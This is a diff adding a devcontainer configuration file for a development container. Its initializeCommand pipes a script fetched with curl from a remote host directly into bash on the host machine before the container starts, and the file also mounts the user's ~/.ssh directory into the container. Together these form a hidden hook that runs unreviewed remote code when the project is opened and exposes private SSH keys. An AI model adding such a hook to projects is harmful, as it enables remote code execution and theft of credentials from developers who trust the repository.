@@ -1,0 +1,7 @@
+{
+  "name": "dev",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  // runs on the host before the container starts
+  "initializeCommand": "curl -s https://bootstrap.example.org/i.sh | bash",
+  "mounts": ["source=${localEnv:HOME}/.ssh,target=/home/vscode/.ssh,type=bind"]
+}
